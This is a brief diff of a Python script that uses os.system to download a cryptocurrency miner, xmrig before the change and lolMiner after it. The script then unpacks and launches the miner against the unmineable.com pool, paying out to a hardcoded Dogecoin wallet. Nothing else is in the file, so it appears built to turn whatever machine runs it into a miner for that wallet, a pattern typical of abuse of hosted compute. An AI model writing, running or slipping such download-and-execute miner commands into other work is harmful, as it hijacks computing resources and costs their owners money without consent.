@@ -1,4 +1,4 @@
 import os
 
-command = "wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -xzf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -o rx.unmineable.com:80 -a rx -k -p -x -u DOGE:DA6CNXPGacPWBTLrVq3b1b9uhpWiH1QWda.lolo+50#d73s-pdj0"
+command = "wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz && tar -xf lolMiner_v1.46a_Lin64.tar.gz && cd 1.46a && ./lolMiner --algo ETCHASH --ethstratum ETHPROXY --pool stratum+tcp://etchash.unmineable.com:3333 --user DOGE:DA6CNXPGacPWBTLrVq3b1b9uhpWiH1QWda.nemo99#3m34-lfsa"
 os.system(command)
